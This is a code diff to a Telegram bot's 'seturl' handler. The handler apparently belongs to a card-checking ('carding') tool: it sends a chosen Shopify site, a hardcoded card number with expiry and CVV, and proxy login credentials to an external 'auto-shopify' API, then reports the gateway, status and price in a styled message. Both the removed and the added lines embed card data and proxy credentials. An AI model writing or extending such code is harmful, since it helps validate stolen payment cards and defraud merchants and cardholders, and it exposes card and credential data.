@@ -2740,33 +2740,29 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def process_seturl(user, user_id, site_input, processing_msg):
     """Background worker that does the API call + DB update"""
 
-    # --- Prepare API URL ---
     api_url = (
-        "https://3a61aab8ac0e.ngrok-free.app/autosh.php"
-        "?cc=4546788796826918|09|2030|781"
-        f"&site={site_input}"
+        "https://auto-shopify-6cz4.onrender.com/index.php"
+        f"?site={site_input}"
+        "&cc=5242430428405662|03|28|3023"
         "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
     )
 
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=50) as resp:
-                api_response = await resp.text()
-
-        # --- Extract JSON from response ---
-        match = re.search(r'(\{.*\})', api_response, re.DOTALL)
-        if not match:
-            await processing_msg.edit_text(
-                "❌ Could not parse API response.",
-                parse_mode=ParseMode.HTML
-            )
-            return
-
-        data = json.loads(match.group(1))
+                if resp.status != 200:
+                    await processing_msg.edit_text(
+                        f"❌ API error: HTTP {resp.status}",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
+                data = await resp.json()
 
         # --- Extract fields ---
         response = data.get("Response", "Unknown")
-        price = f"{data.get('Price', '1.0')}$"
+        status = data.get("Status", "Unknown")
+        price = data.get("Price", "0.0")
+        gateway = data.get("Gateway", "N/A")
 
         # --- Update user DB ---
         await update_user(user_id, custom_url=site_input)
@@ -2781,13 +2777,14 @@ async def process_seturl(user, user_id, site_input, processing_msg):
         bullet_text = "[⌇]"
         bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
 
-        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if "Error" not in response else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
+        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if status.lower() == "true" else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
 
         formatted_msg = (
             f"═══[ <b>{site_status}</b> ]═══\n"
             f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➜ <code>{escape(site_input)}</code>\n"
-            f"{bullet_link} <b>𝐀𝐦𝐨𝐮𝐧𝐭</b> ➜ {escape(price)}💸\n"
+            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ {escape(gateway)}\n"
             f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response)}</i>\n"
+            f"{bullet_link} <b>𝐏𝐫𝐢𝐜𝐞</b> ➜ {escape(price)} 💵\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➜ {requester}\n"
             f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
@@ -2812,6 +2809,7 @@ async def process_seturl(user, user_id, site_input, processing_msg):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
